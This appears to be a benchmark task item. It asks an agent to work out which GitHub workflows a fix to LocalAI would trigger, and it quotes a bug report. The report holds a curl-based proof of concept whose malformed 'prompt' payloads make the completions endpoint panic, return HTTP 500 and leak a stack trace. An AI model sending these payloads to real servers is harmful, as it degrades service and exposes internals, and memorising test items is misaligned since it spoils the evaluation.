# Recover the symbolic verification state this change produces

A regression report was filed against `mudler/LocalAI`.  The report is quoted verbatim below.

## Report

```
Bug 7: Malformed `prompt` field panics the streaming completions handler

**LocalAI version:**
commit `05b8d8aa` (2026-07-14, master)

**Environment, CPU architecture, OS, and Version:**
Linux x86_64. Docker container built from the repo Dockerfile with `-race` instrumentation. Not architecture specific.

**Describe the bug**

`RequestExtractor.mergeOpenAIRequestAndModelConfig` (`core/http/middleware/request.go:612-621`) type-switches on the client-supplied `prompt` field. If `prompt` is an empty array, an array of non-strings, or omitted entirely, none of the matched cases append anything to `config.PromptStrings`, leaving it with length 0. No error is raised at this stage.

`CompletionEndpoint`'s streaming branch (`core/http/endpoints/openai/completion.go:109,115`) only guards `len(config.PromptStrings) > 1`, never checking for 0, then unconditionally evaluates `config.PromptStrings[0]` at line 115. This causes `runtime error: index out of range [0] with length 0`.

**To Reproduce**

```bash
mkdir -p /tmp/localai-poc-bug7 && cd /tmp/localai-poc-bug7

cat > model.yaml <<'EOF'
name: mock-model
backend: mock-backend
parameters:
  model: mock-model.bin
EOF

mkdir -p models
cp model.yaml models/mock-model.yaml

docker network create localai-audit-net 2>/dev/null || true

docker run -d --rm --network localai-audit-net \
  --name laudit-victim \
  -p 0:8080 -v "$PWD/models:/models" \
  localai-audit:latest run --address 0.0.0.0:8080 \
  --models-path /models --api-keys "" \
  --external-grpc-backends "mock-backend:/usr/local/bin/mock-backend"

sleep 5
PORT=$(docker port laudit-victim 8080 | head -1 | sed 's/.*://')
BASE="http://127.0.0.1:$PORT"

echo "=== baseline: valid string prompt ==="
curl -sS -m 15 -w '\nHTTP_STATUS=%{http_code}\n' -X POST "$BASE/v1/completions" \
  -H 'Content-Type: application/json' \
  -d '{"model":"mock-model","stream":true,"prompt":"Hello world"}'

echo "=== attack a: prompt is empty array ==="
curl -sS -m 15 -w '\nHTTP_STATUS=%{http_code}\n' -X POST "$BASE/v1/completions" \
  -H 'Content-Type: application/json' \
  -d '{"model":"mock-model","stream":true,"prompt":[]}'

echo "=== attack b: prompt is array of non-strings ==="
curl -sS -m 15 -w '\nHTTP_STATUS=%{http_code}\n' -X POST "$BASE/v1/completions" \
  -H 'Content-Type: application/json' \
  -d '{"model":"mock-model","stream":true,"prompt":[1,2,3]}'

echo "=== attack c: prompt omitted entirely ==="
curl -sS -m 15 -w '\nHTTP_STATUS=%{http_code}\n' -X POST "$BASE/v1/completions" \
  -H 'Content-Type: application/json' \
  -d '{"model":"mock-model","stream":true}'

docker inspect -f '{{.State.Running}}' laudit-victim
```

**Expected behavior**

A missing, empty, or malformed `prompt` field should be rejected with a 400 validation error before reaching the streaming branch, not cause an internal panic.

**Logs**

```
=== attack c: prompt omitted entirely ===
{"error":{"code":500,"message":"runtime error: index out of range [0] with length 0","type":""}}
HTTP_STATUS=500

[PANIC RECOVER] runtime error: index out of range [0] with length 0 goroutine 441 [running]:
github.com/mudler/LocalAI/core/http.API.Recover.RecoverWithConfig.func37.1.1()
	/go/pkg/mod/github.com/labstack/echo/v4@v4.15.1/middleware/recover.go:99 +0x285
panic({0x6603a80?, 0xc0016d5758?})
	/usr/local/go/src/runtime/panic.go:860 +0x13a
github.com/mudler/LocalAI/core/http/routes.RegisterOpenAIRoutes.CompletionEndpoint.func50(...)
	/src/core/http/endpoints/openai/completion.go:115 +0x2e74
```

All three malicious payloads (`prompt=[]`, `prompt=[1,2,3]`, `prompt` omitted) produced the identical panic and HTTP 500, while the baseline string-prompt request returned HTTP 200 with a valid SSE stream.

**Additional context**

Echo's `Recover` middleware catches the panic on every request, so the process itself stays alive (`docker inspect` reports `Running=true` after every malicious request). This is a per-request DoS with a stack trace leaked into the response body's `message` field, not a full container crash. Prior audit verdict: `VERIFIED_CRASH`.

### Impact

Any unauthenticated caller can return HTTP 500 on demand against `/v1/completions` by sending a missing, empty, or non-string `prompt` array in a streaming request. Each request panics and is individually recovered, so this degrades availability and leaks an internal stack trace (file paths, line numbers) in the response rather than crashing the whole server, but it is reliably repeatable at zero cost per request.

### Fix

In `CompletionEndpoint`'s streaming branch, check `len(config.PromptStrings) == 0` and return a 400 error before indexing `PromptStrings[0]`. Additionally, reject non-string entries in the `prompt` array during request validation instead of silently dropping them.
```

## What you have

- `/testbed/repo` is the repository checked out at the **pre-change** commit `2b61e4bc1d84f4fad786ae024f74e12f059b7389`.  There
  is no git history: read the files directly.
- The pull request that actually fixed this issue is **not** in the container and cannot be fetched.

## Evaluation context

Assume the prospective fix has just **updated an existing non-draft pull request**.

- PR lifecycle action: `synchronize`
- target branch: `master`
- consider both `pull_request` and `pull_request_target` trigger families
- apply the repository's native `types`, `branches`, `branches-ignore`, `paths`, `paths-ignore`
- direct workflow activation only; no push/workflow_dispatch/schedule/workflow_run

## What to produce

Write JSON to `/testbed/answer.json`:

```json
{"case_id": "mudler_LocalAI__11021__2b61e4b",
  "activated_workflows": [".github/workflows/test.yml"]}
```

- list every workflow under `repo/.github/workflows/` that this change would activate
- workflow paths exactly as under `repo/.github/workflows/`; a path that does not exist scores 0

## Rules

- Do **not** use the network. Fetching the upstream fix is cheating and is detected.
- Solve it from the repository.
